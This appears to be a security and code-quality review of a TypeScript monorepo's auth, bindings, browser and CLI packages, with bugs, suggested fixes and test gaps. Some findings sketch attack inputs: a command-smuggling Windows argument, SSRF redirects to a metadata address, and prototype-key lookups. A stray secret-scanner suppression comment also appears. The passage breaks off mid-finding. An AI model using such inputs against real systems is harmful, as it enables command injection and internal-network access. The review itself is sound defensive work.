**Assessment:** @lunora/auth is in good health: a genuinely thin, well-documented better-auth wrapper with a carefully parameterized SQL store (no injection paths found — identifiers quoted, all values bound, LIMIT/OFFSET parameterized), a sound single-flight migration cache, consistent secret/token redaction in the admin plane, and an unusually strong test suite that exercises real better-auth end-to-end including a cross-store operator-parity matrix and an IDOR regression test. The findings are edge-case hardening rather than structural problems: a stale-banExpires bug that lets a \"permanent\" ban silently lapse, an inconsistency where the weak-secret hard-fail never fires in the common unset-baseURL production shape, and a few small contract/duplication papercuts.

#### 1. [MEDIUM / bug] banUser: permanent re-ban leaves a stale banExpires, silently un-banning the user

`packages/auth/src/admin.ts:560`

For a permanent ban (expiresInSeconds omitted or <= 0), banUser passes `banExpires: undefined` to `internalAdapter.updateUser` (admin.ts:559-565). Per the package's own adapter semantics — documented at admin.ts:1104-1106 in unbanUser ("`null` (not `undefined`) so the adapter clears the columns rather than skipping them") — an `undefined` field is skipped, not cleared. Failure scenario: an admin temp-bans a user for 1 hour (banExpires set), then escalates to a permanent ban; the old banExpires stays in the row, so better-auth's ban check treats the ban as expired after the original hour and the "permanent" ban silently lapses. Related edge in the same block: a negative expiresInSeconds passes `Math.min(Math.trunc(neg), MAX_BAN_SECONDS)` -> seconds <= 0 -> silently becomes a permanent ban instead of a validation error, unlike impersonationSeconds which rejects non-positive values (admin.ts:961). <!-- secret-scanner:allow -->

**Suggested fix:** Pass `banExpires: seconds > 0 ? new Date(...) : null` so a permanent ban explicitly clears any prior expiry, and reject negative/non-finite expiresInSeconds with a LunoraAuthAdminError like impersonateUser does.

#### 2. [MEDIUM / security] Weak-secret hard-fail never fires in the most common production shape (unset baseURL)

`packages/auth/src/create-auth.ts:113`

hardenAuthOptions throws on a weak secret only when `isHttpsBaseUrl(options.baseURL)` is true (create-auth.ts:113-115); otherwise it only console.warns. But the package's own analysis (create-auth.ts:53-57 and the useSecureCookies fix at line 128) states that `baseURL` is "very commonly unset" on production Workers deployments — that exact reasoning drove inverting the cookie default to secure-unless-proven-http. The weak-secret check keeps the old "only positively-HTTPS counts as production" logic, so a real production deploy with an unset baseURL and an 8-character AUTH_SECRET boots with just a console.warn (invisible on Workers unless someone tails logs), leaving session signing brute-forceable. The two hardening checks in the same function disagree about what counts as production.

**Suggested fix:** Mirror the cookie logic: throw unless `isExplicitHttpBaseUrl(options.baseURL)` (warn only for explicit http:// dev origins), so unset-baseURL deploys fail loudly like HTTPS ones.

#### 3. [LOW / bug] verifyTurnstile leaks a raw SyntaxError on a 200 response with a non-JSON body, breaking its documented error contract

`packages/auth/src/turnstile.ts:141`

The doc contract (turnstile.ts:104-109) says the function "throws a structural LunoraError ... only when the siteverify call itself fails (network error or non-2xx)". But `await response.json()` at line 141 runs outside the try/catch that wraps fetch, so a 200 response with a non-JSON body (interception by a corporate proxy or captive portal, a Cloudflare edge error page) throws an unwrapped SyntaxError. Direct callers that match on `code === "SERVICE_UNAVAILABLE"` to distinguish "siteverify down" from "bot verdict" mis-handle this case. verifyTurnstileMiddleware happens to be safe because its catch-all treats any throw as a transport failure (turnstile-middleware.ts:110).

**Suggested fix:** Wrap `response.json()` in the same try/catch (or a second one) and rethrow as LunoraError("SERVICE_UNAVAILABLE", "turnstile siteverify returned a non-JSON body", { cause }).

#### 4. [LOW / refactor] Capability derivation duplicated verbatim between capabilities() and config()

`packages/auth/src/admin.ts:620`

The five-line capabilities object (accounts/admin/organization/passkey/twoFactor derived from plugin ids + `features` overrides) is built identically in `capabilities()` (admin.ts:580-589) and again inside `config()` (admin.ts:618-626), including the duplicated `ids` Set and `has` helper. A future capability (or a new plugin-id alias) must be edited in two places or the config panel and the capability gate silently disagree — the exact drift `config()` embedding `capabilities` was meant to avoid.

**Suggested fix:** Extract a single `deriveCapabilities(context_.options, features)` helper and call it from both methods.

#### 5. [LOW / refactor] AuthConfigInfo / AuthOrgRole / AuthTeam / AuthTeamMember / AuthUserFieldSpec are exported from admin.ts but dropped by the package entry

`packages/auth/src/index.ts:2`

admin.ts deliberately exports these types (admin.ts:1132-1152), but index.ts's re-export list (index.ts:2-17) omits them and package.json has no `./admin` subpath, so they are unreachable from the published package. Consequence: `packages/runtime/src/auth-admin-routes.ts:78` (plus the client and studio hooks) carry hand-maintained structural duplicates of AuthConfigInfo — the runtime's copy is arguably deliberate decoupling, but app code that depends on @lunora/auth and wraps `AuthAdmin.config()` (or renders teams/org-roles) cannot name the result type at all and must re-derive it via `Awaited<ReturnType<AuthAdmin["config"]>>`.

**Suggested fix:** Add the five missing type names to the `export type` block in index.ts; they are already part of admin.ts's intended public surface.

#### Missing test coverage

- AuthAdmin.config() has zero tests — plugins list, userFields derivation (input:false/references/CORE_USER_FIELDS filtering in buildUserFields), org sub-feature detection (teams/roles via getAuthTables), and the session/rateLimit echo are all unexercised (admin.ts:615-651).
- banUser with expiresInSeconds: no test covers a temporary ban at all — expiry landing ~N seconds out, the MAX_BAN_SECONDS clamp, negative/NaN values, or re-banning permanently after a temp ban (the stale-banExpires bug would have been caught here) (admin.ts:555-571).
- hardenAuthOptions' throw path — weak secret + HTTPS baseURL → LunoraError — is untested; only the console.warn path and the no-warn path are covered (create-auth.ts:113-115 vs create-auth.test.ts:266-286).
- listPasskeys / deletePasskey / disableTwoFactor have no tests; disableTwoFactor's two-step (deleteMany twoFactor rows + updateUser twoFactorEnabled:false) is unverified against a real auth instance with the plugins enabled (admin.ts:938-947).
- verifyTurnstileMiddleware's expectedAction forwarding and the custom validate(result) predicate (reject-on-false → 403) are untested at the middleware level — only expectedHostname is (turnstile-middleware.ts:63,123).
- The memory/SQL cross-store agreement matrix covers filters only, not ordering: sortRows uses localeCompare while SQLite ORDER BY uses binary collation, so mixed-case string sorts diverge between the two stores ('a' vs 'B') and nothing pins the intended behavior (store.ts:92-105 vs sql-store.ts:261).
- removeUser asserts only that the user row disappears — no assertion that credential account rows (password hashes) or sessions are cascaded by internalAdapter.deleteUser, so an upstream better-auth behavior change would orphan password material undetected (admin.ts:1053-1057, admin.behaviour.test.ts:157-165).
- AuthAdmin.updateUser (arbitrary data passthrough onto internalAdapter.updateUser, including additionalFields and the normalizeRow shaping of the result) has no test (admin.ts:1123-1128).

<a id="lunorabindings"></a>

### @lunora/bindings

**Assessment:** @lunora/bindings is in good health: the six binding facades are small and disciplined, SQL composition is injection-safe by construction (lit/ident/tableRef allowlists with tests proving it), signed URLs use timing-safe WebCrypto verify, and the ~230-case test suite covers most public behavior including tenant-scoping and cap-enforcement edge cases. The real issues are concentrated at the edges: a concurrency race that defeats the vector sync hook's compensation guarantee, two signed/delivery URL construction bugs (path-bearing baseUrl never verifies; unencoded `#` color values truncate the URL the docs themselves recommend), a bytes-vs-code-units key-limit check, and verbatim crypto/key-validation duplication with @lunora/storage that belongs in the repo's shared/ folder.

#### 1. [MEDIUM / bug] Compensating deletes race in-flight upserts after a partial fan-out failure — **verified: confirmed**

`packages/bindings/src/vectors/context.ts:338`

createVectorSyncHook runs its upsert/clear operations through concurrentMap (src/vectors/concurrent.ts:42), which uses Promise.all(workers). When one operation rejects, Promise.all rejects immediately, but the other workers are not cancelled — they finish their in-flight embed/upsert calls AND keep pulling new operations from the queue (the cursor keeps advancing in each worker's infinite loop). The catch block then runs the compensating Promise.allSettled(deleteByIds) while sibling upserts are still executing. An upsert that completes after its index's compensating delete leaves a stale-but-present vector in Vectorize — exactly the state the compensation is documented to prevent ('the diverged state is at least empty rather than stale-but-present'). Failure scenario: table with 2+ vector indexes, embedder for index A is slow, upsert for index B throws; compensation deletes fire, then A's upsert lands, leaving a searchable vector for a row whose SQLite write rolled back.

**Suggested fix:** Make concurrentMap settle all workers before rejecting (collect errors, stop pulling new items once any error is recorded, then throw the first error after Promise.all of the workers resolves), or in the hook use an allSettled-style wrapper and only run compensation after every operation has settled.

**Verifier note:** Confirmed by reading the code. concurrentMap (concurrent.ts:23-42) awaits Promise.all(workers); on the first rejection it rejects immediately, but sibling workers are not cancelled — they finish their in-flight embed/upsert calls and, because there is no abort flag, keep pulling new operations (cursor advances unconditionally in each worker's infinite loop). The catch block in createVectorSyncHook (context.ts:331-341) then immediately runs Promise.allSettled(deleteByIds) over ALL index names while sibling upserts are still executing. An upsert that lands after its index's compensating delete leaves a stale-but-present vector for a row whose SQLite write rolled back — exactly the state the comment at context.ts:334-336 claims the compensation prevents ("at least empty rather than stale-but-present"). The scenario is reachable: a table with 2+ vector indexes (inline + standalone) is a supported configuration used in the package's own tests, and embedders are documented to make remote calls, so heterogeneous latency is expected. No test pins the race (the compensation test at **tests**/vectors/ctx.test.ts:246 uses instantly-resolving mocks), no upstream guard prevents it, and the single-threaded event loop does not help since the interleaving happens while the compensation itself is awaited. Severity adjusted to medium: it only manifests on a partial fan-out failure (already the error path), the module explicitly documents that SQLite/Vectorize divergence is unavoidable and best-effort with idempotent-retry as the authoritative recovery, and the bug's delta is "stale until retried" instead of "empty until retried" — a real but bounded weakening of an admittedly best-effort mitigation, not a broken transactional guarantee.

#### 2. [MEDIUM / bug] buildSignedImageUrl with a path-bearing baseUrl mints URLs that never verify

`packages/bindings/src/images/signed-delivery-url.ts:220`

buildSignedImageUrl signs canonicalize(host, normalizedKey, exp, transform) where normalizedKey is options.key, and appends the key to the full baseUrl (line 166-170: `${base}/${safeKey}` keeps any path on baseUrl). verifySignedImageUrl reconstructs the key from the ENTIRE url.pathname (lines 220-224). With baseUrl = "https://cdn.acme.test/img" and key = "a.png", the minted URL's pathname is "/img/a.png", so verify canonicalizes key = "img/a.png" while the signature was computed over "a.png" — every URL fails with bad_signature. Nothing validates or strips a path on baseUrl, and the sibling buildImageDeliveryUrl explicitly supports path-style bases, so a Worker mounted at a subpath silently produces 100% verification failures. All existing tests use origin-only baseUrls, which is why this is unnoticed.

**Suggested fix:** Either bind the base path into the canonical (strip the baseUrl's pathname prefix during verify), or reject a baseUrl whose pathname is not "/" at build time with a descriptive error.

#### 3. [MEDIUM / bug] Transform values are not percent-encoded; the recommended `#RRGGBB` color silently truncates the URL

`packages/bindings/src/images/delivery-url.ts:46`

serializeTransform splices option values verbatim into the /cdn-cgi/image/<options>/<source> path, guarding only `,` and `=`. It does not encode or reject `#`, `?`, or `/`. The thrown error message (line 50) explicitly recommends "use the hex form (e.g. `#RRGGBB`/`%23RRGGBB`)" — but a caller passing background: "#ff0000" (the natural CSS form the message endorses) produces `.../cdn-cgi/image/background=#ff0000/pic.png`, where `#` starts the URL fragment: the request actually sent is `/cdn-cgi/image/background=` with the entire source path swallowed into the fragment. A `?` in a value similarly turns the rest of the path into a query string, and a `/` splits the options segment. This is a silent wrong-image/404 bug for the exact input the code suggests.

**Suggested fix:** encodeURIComponent each serialized value (Cloudflare's URL-transform docs expect URL-encoded values), or extend the fail-loud guard to `#`, `?`, `/` and fix the error text to recommend only `%23RRGGBB`.

#### 4. [MEDIUM / reuse] HMAC signed-URL machinery and KV key validation are verbatim copies of @lunora/storage — shared/ is the designated home

`packages/bindings/src/images/signed-delivery-url.ts:25`

toBase64Url, fromBase64Url, importHmacKey (including the 64-entry FIFO key cache), MAX_EXPIRES_IN_SECONDS, SCHEME_PREFIX_RE and LEADING_SLASH_RE in src/images/signed-delivery-url.ts:19-79 are byte-for-byte duplicates of packages/storage/src/signed-url.ts:25-84 (the comments even cross-reference each other). Likewise validateKey/scopeKey in src/kv/create-kv.ts:32-105 duplicate packages/storage/src/create-storage.ts:185-231 ("Mirrors @lunora/storage's validateKey"). The repo's top-level shared/ folder exists precisely for zero-dependency helpers needed by multiple packages without a runtime dependency edge (bundler-inlined, per CLAUDE.md). Concrete payoff: the UTF-16-vs-bytes key-limit bug and any future crypto fix currently have to be patched in two places, and the two copies have already started to drift (regex spelling `a-z0-9` vs `a-z\d`).

**Suggested fix:** Extract shared/signed-url-crypto.ts (base64url + HMAC key cache + canonical helpers) and shared/scoped-key.ts (validateKey/scopeKey parameterized by package label), and import them by relative path from both packages.

#### 5. [LOW / bug] KV 512-byte key limit is enforced in UTF-16 code units, not bytes

`packages/bindings/src/kv/create-kv.ts:37`

validateKey/validatePrefix/scopeKey (lines 37, 68, 100) compare key.length against MAX_KEY_LENGTH = 512, but the constant, comments, and error messages all say Workers KV's ceiling is 512 BYTES. String.length counts UTF-16 code units, so a 300-character CJK/emoji key (up to ~1200 UTF-8 bytes) passes local validation and is then rejected remotely by KV — defeating the fail-fast purpose and making the thrown message ("exceeds 512-byte limit") wrong for keys it does reject near the boundary. The sibling analytics module measures byte budgets correctly with TextEncoder (src/analytics/create-analytics.ts:31-41), so the package is internally inconsistent. The same defect exists in the @lunora/storage original this code mirrors (packages/storage/src/create-storage.ts:190).

**Suggested fix:** Measure with new TextEncoder().encode(key).length (a shared TEXT_ENCODER as in the analytics module), in both this file and the storage original.

#### 6. [LOW / bug] limit() accepts non-integer / non-positive / over-ceiling values, emitting SQL the engine rejects

`packages/bindings/src/r2sql/builder.ts:160`

SelectBuilder.limit(n) (and SetOperation.limit, src/r2sql/set-operation.ts:80-84) stores n unvalidated; lit() only rejects non-finite numbers, so limit(3.5) renders `LIMIT 3.5`, limit(0)/limit(-1) render values R2 SQL rejects, and limit(50000) exceeds the documented 1–10,000 ceiling the method's own JSDoc cites — all surfacing as opaque remote errors. This is inconsistent with the package's stated eager-validation posture: kv list throws TypeError on a non-positive/non-integer limit (src/kv/create-kv.ts:209-211) and vectors.query throws RangeError on an out-of-range topK (src/vectors/create-vectors.ts:97-101).

**Suggested fix:** Throw a RangeError in limit() unless Number.isInteger(n) && n >= 1 && n <= 10000, matching the kv/vectors precedent.

#### 7. [LOW / security] Prototype-key lookups on plain-object registries bypass the not-found guard on admin endpoints

`packages/bindings/src/kv/kv-introspector.ts:81`

resolveNamespace does `namespaces[binding]` on a plain object literal; a studio/admin request with namespace = "**proto**" or "constructor" (external input via /_lunora/admin/kv/*) returns Object.prototype / the Object constructor instead of undefined, so the clean BAD_REQUEST LunoraError guard (line 83-85) is bypassed and the code crashes deeper with an uncontrolled TypeError (`ns.list is not a function`) — a 500 instead of a 4xx, and an unvetted error shape on the wire. The same pattern exists in src/vectors/create-vectors.ts:17-27 (resolveIndex) and src/vectors/create-admin-introspector.ts:115-124 (indexes[name] / embedders[name], where the `binding === undefined` check passes for "**proto**" and execution proceeds to call a non-function). No data exposure or pollution (only reads), but it is an externally reachable unhandled-exception path.

**Suggested fix:** Guard lookups with Object.hasOwn(registry, name), or build the registries with Object.create(null).

#### Missing test coverage

- concurrentMap (src/vectors/concurrent.ts) has no direct unit test: order preservation, the concurrency bound actually holding at `limit` in-flight, and — critically — what happens to still-running and not-yet-started operations when one rejects (the compensation race in finding 1).
- createVectors query topK validation branches are untested: the RangeError for topK outside [1,100], and the tightened 20 ceiling when returnValues:true or returnMetadata:"all" is set (src/vectors/create-vectors.ts:94-101); only valid topK values appear in tests.
- buildSignedImageUrl/verifySignedImageUrl round-trip with a baseUrl that carries a path (e.g. https://cdn.acme.test/img) — untested, and would have caught the always-bad_signature bug.
- buildImageDeliveryUrl with option values containing URL metacharacters the guard misses (`#RRGGBB` background, values with `/` or `?`) — delivery-url tests only cover `,`-bearing values.
- KV key/prefix validation with multibyte (non-ASCII) keys near the 512-byte ceiling — the analytics suite tests UTF-8 byte measurement explicitly, the kv suite only tests ASCII 'x'.repeat(513).
- createKvIntrospector's direct surface: the BAD_REQUEST unknown-namespace error, putValue round-tripping expiration/expirationTtl/metadata, getValue for an absent key, and deleteKey — only the from-env discovery variant has tests (kv-introspector-from-env.test.ts).
- SelectBuilder.limit()/SetOperation.limit() with invalid values (0, negative, fractional, >10000) — no test pins the current pass-through behavior or a future validation.
- createVectorSyncHook delete-op failure path: a rejected deleteByIds during the delete fan-out (Promise.all at src/vectors/context.ts:256) has no test asserting the error propagates to the write path.

<a id="lunorabrowser"></a>

### @lunora/browser

**Assessment:** A small, focused package with an unusually well-hardened SSRF string guard (WHATWG-normalized IPv4/IPv6 forms, NAT64, mapped/compat encodings, trailing-dot FQDN bypass, DoH rebinding re-check) and solid unit coverage of that guard. The remaining issues are configuration-combination gaps: the redirect-chain interceptor is disabled whenever allowPrivateTargets is true (silently voiding allowedHosts on redirects), the documented "navigation + operation" timeout only actually bounds navigation, and caller-error rejections are miscoded as INTERNAL so they surface as redacted 500s.

#### 1. [MEDIUM / bug] timeoutMs only bounds page.goto — the operation itself (screenshot/pdf/content/evaluate) is unbounded, contradicting the documented invariant

`packages/browser/src/create-browser.ts:521`

types.ts line 94-98 documents NavigateOptions.timeoutMs as a "Hard timeout in milliseconds for the navigation + operation. Clamped to a sane ceiling so a hung/hostile page can't pin the worker." The implementation passes `timeout` only to `page.goto(target, { timeout, … })` (line 519); `use(page)` on line 521 — page.screenshot, page.pdf, page.content, and especially page.evaluate for scrape() — runs with no timeout at all. Playwright's page.evaluate has no default timeout: a hostile page that traps the evaluated function (e.g. redefines document.querySelector to `while(true){}`) makes `ctx.browser.scrape(url, fn)` hang until the Cloudflare action/worker limit kills it, holding the billed Browser Rendering session open the whole time. page.pdf likewise takes no timeout option. So the MAX_TIMEOUT_MS ceiling (line 19) that the guard machinery carefully enforces is enforceable only for the navigation phase — the exact "hung/hostile page pins the worker" scenario the constant's comment claims to prevent remains open post-navigation.

**Suggested fix:** Race `use(page)` against the remaining timeout budget (Promise.race with a timer that rejects with a LunoraError), or at minimum pass `timeout` into page.screenshot's options and document that pdf/evaluate rely on the outer race. The browser is closed in withBrowser's finally either way, so a timeout rejection tears the session down correctly.

#### 2. [MEDIUM / security] Redirect-chain guard is skipped entirely when allowPrivateTargets is true, even with allowedHosts configured — **verified: confirmed**

`packages/browser/src/create-browser.ts:492`

The page.route interceptor that re-validates every navigation (redirect) target is registered only under `if (!allowPrivateTargets && page.route)`. When a deployment sets `allowPrivateTargets: true` together with `allowedHosts` (the natural config for pinning the browser to a specific internal host reachable via Tunnel — exactly the use case the allowPrivateTargets JSDoc describes), only the INITIAL URL is checked against the allowlist (validateUrl line 354). A 3xx redirect from the allowlisted host then navigates the browser to any host at all — including other private/metadata hosts — with zero checks, because no interception is installed. This contradicts the allowedHosts documentation in types.ts ("the only guard that fully closes DNS rebinding" / the validateUrl doc calling it the "hard guarantee"): the guarantee only holds for the first hop in this configuration. Failure scenario: allowedHosts: ["internal-app.example"], allowPrivateTargets: true; internal-app.example has an open-redirect or attacker-influenced Location header → browser lands on http://169.254.169.254/... and content()/screenshot() returns it to the caller.

**Suggested fix:** Register the route interceptor whenever `page.route && (!allowPrivateTargets || (options.allowedHosts?.length ?? 0) > 0)`. assertNavigationAllowed already threads allowPrivateTargets and allowedHosts through validateUrl, so the handler body needs no change — with allowPrivateTargets true it would enforce just the allowlist on every hop.

**Verifier note:** Confirmed by reading packages/browser/src/create-browser.ts. The redirect-chain interceptor is registered only under `if (!allowPrivateTargets && page.route)` (line 492), and the pre-launch DoH re-check is likewise gated `if (!allowPrivateTargets && resolveDns)` (line 464). validateUrl (line 354) enforces allowedHosts unconditionally, but only on the INITIAL URL. So when a deployment sets allowPrivateTargets: true together with allowedHosts, only the first hop is pinned; a 3xx redirect from the allowlisted host is followed by page.goto (line 519) with zero re-validation, landing the browser on any host including 169.254.169.254. content()/screenshot() then return that to the caller.

Refutation failed on every axis: (1) No type or runtime constraint makes the combination unrepresentable — allowedHosts (types.ts:146) and allowPrivateTargets (types.ts:158) are independent optional fields, codegen passes options straight through. (2) The combination is not just possible but is the natural/recommended config for pinning to an internal host — the advisor lint browser-allow-private-targets.ts explicitly recommends "pin the specific host with allowedHosts instead of opening all private targets," steering users directly into the vulnerable state (a private/internal pinned host requires allowPrivateTargets: true precisely because it is private). (3) The behavior contradicts the docs: types.ts:141 calls allowedHosts "the only guard that fully closes DNS rebinding" and validateUrl JSDoc (lines 310-311) calls it the "hard guarantee" — but that holds only for the initial hop in this config. (4) Tests (redirect-chain SSRF guard block, lines 437-512) exercise only the default config; none pin the allowPrivateTargets+allowedHosts combination, so nothing enforces safe behavior there. (5) URLs are caller-supplied and treated as an external SSRF surface by the package's own lints.

Adjusted high -> medium: the exploit requires a redirect originating from the allowlisted host (open redirect, compromised/attacker-influenced internal endpoint, or attacker-controlled Location header), which is an extra precondition beyond arbitrary-URL SSRF. It is a real, defense-in-depth gap that breaks an explicitly documented "hard guarantee" in exactly the config the tooling recommends, but not a one-step arbitrary-SSRF primitive.

#### 3. [MEDIUM / security] Sub-resource requests bypass every SSRF check, letting a rendered page probe (and with permissive CORS, read) private hosts

`packages/browser/src/create-browser.ts:497`

The route handler continues any non-navigation request unconditionally (lines 495-501: `isNavigationRequest?.() ?? true` → `route.continue()` with no URL validation). The inline comment asserts "only the navigation vector is an SSRF concern here", but that is inconsistent with the package's own threat model: the redirect guard exists precisely because private hosts can be reachable from the rendering egress (Tunnel / private-network binding, per the validateUrl doc at line 313-316). A hostile-but-public page passed to content()/scrape() can issue `<img>`/`fetch` sub-resource requests at 10.x/169.254.169.254/etc. to port-scan the internal network via timing/onerror signals, and where an internal service responds with permissive CORS (common on internal dashboards/dev APIs) can read the response, inline it into the DOM, and have `content()` hand it back to the attacker-facing caller. SOP limits — not eliminates — the read vector; the probe vector is unrestricted.

**Suggested fix:** Apply at least the private-target check (isPrivateTarget / allowedHosts) to sub-resource request URLs too when the guard is active, aborting private ones with "blockedbyclient". Public-host sub-resources (CDNs, images) keep working; only the internal-probe surface closes.

#### 4. [LOW / bug] Caller-error URL rejections are coded INTERNAL, so they surface on the wire as redacted 500s — inconsistent with the FORBIDDEN used by the sibling guards

`packages/browser/src/create-browser.ts:363`

validateUrl throws LunoraError("INTERNAL", …) for a private/internal target (line 363) and for embedded credentials (line 351), and bare TypeErrors for scheme/parse failures (lines 335, 343, 347). Per @lunora/errors' catalog (INTERNAL is `internal: true`, status 500) and toErrorBody (packages/errors/src/to-error-body.ts line 54-55, 77), all of these reach the client as HTTP 500 with the message replaced by "Internal error" — hiding the actionable text ("pass allowPrivateTargets: true…") and misclassifying a caller-supplied bad URL as a server fault in status codes, alerting, and metrics. Meanwhile the two functionally identical refusals — allowedHosts mismatch (line 358) and the DNS-rebinding refusal (line 265) — use FORBIDDEN, which is echoed verbatim as a 403. Same boundary, same class of rejection, opposite wire behavior depending on which guard fires first.

**Suggested fix:** Use FORBIDDEN (or a BAD_REQUEST-family code) for the private-target and credentials rejections, and consider a non-internal code for the scheme/parse TypeErrors, so all URL-boundary refusals present consistently as 4xx with their messages intact.

#### 5. [LOW / bug] BrowserBindingLike's "non-empty marker" claim is false — `{}` satisfies the type because fetch is optional

`packages/browser/src/types.ts:15`

The JSDoc (types.ts lines 11-12) says the binding is "Typed as a non-empty marker so an arbitrary value (e.g. `{}`) doesn't silently type-check where a binding is required", but the sole member is `readonly fetch?: …` — optional — so `{}` satisfies the interface. The package's own test proves it: fakeBinding() returns a bare `{}` with no type assertion (create-browser.test.ts lines 7-9). Combined with createBrowser's runtime guard only checking falsiness (create-browser.ts line 406), `createBrowser({ binding: {} as any-ordinary-object })` type-checks and passes the guard, deferring failure to an opaque Playwright launch error at first use. The documented early-failure invariant simply does not exist.

**Suggested fix:** Either make `fetch` required in BrowserBindingLike (tests can supply a no-op fetch) so the marker actually excludes `{}`, or fix the comment to say the type is intentionally satisfiable by any object and the real check happens at launch.

#### Missing test coverage

- Redirect-chain guard with allowedHosts: no test that a redirect from an allowlisted host to an off-allowlist PUBLIC host is aborted (the route-handler path through validateUrl's allowlist branch is never exercised — only the private-metadata redirect is).
- allowPrivateTargets: true combined with allowedHosts: no test at all for this configuration; a test asserting redirects are still allowlist-checked would have caught the line-492 guard-skip finding.
- Fail-closed default in the route handler: no test for a route whose request lacks isNavigationRequest (the `?? true` branch at create-browser.ts:495) — every fake route supplies isNavigationRequest: () => true.
- Trailing-dot FQDN denylist bypass: the TRAILING_DOT strip in isPrivateTarget (create-browser.ts:289) has no test (`http://localhost.` / `https://api.internal.`); only the allowedHosts normalization side (`example.com.`) is covered, so the SECURITY-commented bypass fix (lines 282-287) is regression-unprotected.
- DoH AAAA dotted forms: the IPV6_MAPPED_DOTTED and IPV6_COMPATIBLE_DOTTED branches (create-browser.ts:132-147) are reachable only via DoH answer data (the URL parser normalizes them to hex) and no resolveDns test feeds a dotted-form AAAA record like `::ffff:127.0.0.1`.
- DoH non-200 fallback: only a throwing fetch is tested; the `!response.ok → undefined` branch (create-browser.ts:226-228) and the mixed case (A lookup fails, AAAA succeeds with a private record → must still reject) are untested.
- pdf option forwarding: the fake page's pdf() discards its options, so `format`/`printBackground` forwarding (create-browser.ts:542-545) is never asserted, unlike screenshot's.
- resolveDns on redirect targets: no test that the route handler re-runs the DoH check for a redirect hop (assertNavigationAllowed's resolveDns branch at create-browser.ts:476-478 is only covered for the initial URL).

<a id="lunoracli"></a>

### @lunora/cli

**Assessment:** The package is in excellent health: it is heavily and deliberately hardened (DNS-rebinding guards on the studio server, admin-bearer cleartext refusal, registry-manifest injection gates, giget ref pinning, PID-reuse guards in dev lifecycle) with broad test coverage across 60+ test files. Remaining issues are edge cases — Windows cmd.exe quoting gaps, comment-destroying `.dev.vars` rewrites, a couple of inconsistent production-write confirmation gates, and small failure-path leaks — rather than systemic defects.

#### 1. [MEDIUM / bug] Windows shell:true quoting only handles whitespace — cmd.exe metacharacters and embedded quotes break argument integrity

`packages/cli/src/util/spawn.ts:4`

spawnShellCompat quotes an argument only when NEEDS_CMD_QUOTING = /\s/ matches (line 4), and quote() (line 69) wraps in double quotes without escaping embedded `"` or a trailing backslash. With shell:true (required on win32 for pnpm/npx .cmd shims) cmd.exe treats unquoted `&`, `|`, `^`, `<`, `>` as command separators/redirection. Failure scenario: on Windows, `lunora deploy --outdir C:\Dev&Ops\dist` (no whitespace, so unquoted) makes cmd.exe run `Ops\dist` as a second command; an argument containing an embedded double-quote (e.g. a path ending in `\` before the closing quote, `"C:\path\"`) is re-split mid-value. Every spawn site funnels through this helper (deploy, env push, dev, init install), so any argv element containing those characters silently corrupts or executes unintended commands on Windows. spawn.test.ts only covers the whitespace case.

**Suggested fix:** Extend the quoting to (a) quote when any of /[\s&|<>^%"]/ is present, (b) escape embedded `"` as `\"` and double trailing backslashes, and (c) escape cmd metacharacters with `^` outside quotes — or build the command line once and pass it via windowsVerbatimArguments with explicit CommandLineToArgvW-compatible quoting.

#### 2. [MEDIUM / bug] `env set`/`unset`/`generate --set` silently destroy all comments and blank lines in .dev.vars

`packages/cli/src/commands/env/handler.ts:86`

serializeDevVariables (lines 86–98) rebuilds the whole file from the parsed entry map, and parseDevVariableEntries (@lunora/config dev-variables-format.ts:64, whose doc says 'comments/blank/invalid lines dropped') never retains comments. So a single `lunora env set FOO bar` rewrites .dev.vars with every `# ...` comment and blank line removed — including the `# description` comment lines the registry installer itself scaffolds (registry/apply.ts:194–198 writes `# ${variable.description}` above each var) and the section comments the @lunora/config scaffolder emits. Failure scenario: user runs `lunora add auth` (writes documented secret placeholders), then `lunora env set AUTH_SECRET x` — all documentation in the secrets file is silently gone, and values also get re-quoted (`KEY="value"`), changing lines the user never touched. @lunora/config already contains a comment-preserving rewrite path (scaffold-dev-variables.ts:601 'comments + non-secret entries are preserved verbatim') that this handler bypasses.

**Suggested fix:** Do a line-oriented surgical edit (replace/append only the target key's line, preserving everything else verbatim), or reuse/extract @lunora/config's comment-preserving rewrite used by the scaffolder.

#### 3. [LOW / bug] d1-to-hyperdrive leaves the plaintext cross-tenant NDJSON dump behind when the import throws

`packages/cli/src/commands/migrate/handler.ts:599`

runMigrateToHyperdriveCommand cleans up the mkdtemp staging dir only on the straight-line path (rmSync at lines 599–601 runs after runImportCommand returns). runImportCommand throws a LunoraError on any non-2xx batch response (data-transfer.ts:387–391) or on a malformed JSON line, and runExportCommand can throw mid-stream — in all throw paths the rmSync is skipped, so the full plaintext export (which the code's own comment at line 563 calls 'plaintext, cross-tenant') persists in the temp dir until OS cleanup. The early `return { code }` at line 580 for a failed export similarly leaks the (empty) staging dir.

**Suggested fix:** Wrap the export/import sequence in try/finally and do the `rmSync(temporaryDirectory, { force: true, recursive: true })` in the finally block.

#### 4. [LOW / refactor] parseArgs is dead code inside the CLI (only a barrel re-export) and mis-parses option values that start with '-'

`packages/cli/src/util/args.ts:69`

util/args.ts's parseArgs has zero internal call sites — the CLI's real parsing is @visulima/cerebro; the only reference is the re-export in src/index.ts:20, and no other workspace package imports it. It also has a latent parsing wart: `--opt -1` (a negative-number or dash-leading value) is parsed as flag `opt=true` plus short-option `-1` (consumeLongOption line 39 rejects any `next` starting with `-`), so any external consumer relying on it gets wrong results for dash-leading values. There is no **tests** file for it.

**Suggested fix:** Delete util/args.ts and the barrel export (or, if it is intentionally public API, document it, fix the dash-leading-value case, and add tests).

#### 5. [LOW / security] `lunora import --prod` and `lunora backup restore --prod` bulk-write production without the --yes confirmation every sibling destructive command requires

`packages/cli/src/commands/import/handler.ts:20`

runImportCommand's only --prod guard is 'requires an explicit --url' (data-transfer.ts:295). By contrast, `migrate up --prod` requires --yes (migrate/handler.ts:415–419), `backup pitr --restore --prod` requires --yes (backup/handler.ts:257–261), `seed` to a remote target requires --yes or a TTY confirmation (seed/handler.ts:182–205), and `env push` always requires --yes. Failure scenario: an operator (or a script/agent replaying a dev command with a prod link present) runs `lunora import dump.ndjson --prod` — the linked production workerUrl is resolved (resolveProductionWorkerUrl) and thousands of rows are inserted into production with no confirmation step, unlike every other production-mutating command in the CLI. Same for `backup restore <id> --prod` (backup/handler.ts:184–218, which even accepts a BackupCommandOptions.yes field it never checks on the restore path).

**Suggested fix:** Apply the same gate as migrate/pitr: when prod is set (or the target is non-local), require --yes or an interactive confirmation before POSTing the import batches.

#### 6. [LOW / security] Update-notifier cache uses a predictable shared-tmp filename with a plain writeFileSync (CWE-377 symlink clobber)

`packages/cli/src/util/update-notifier.ts:97`

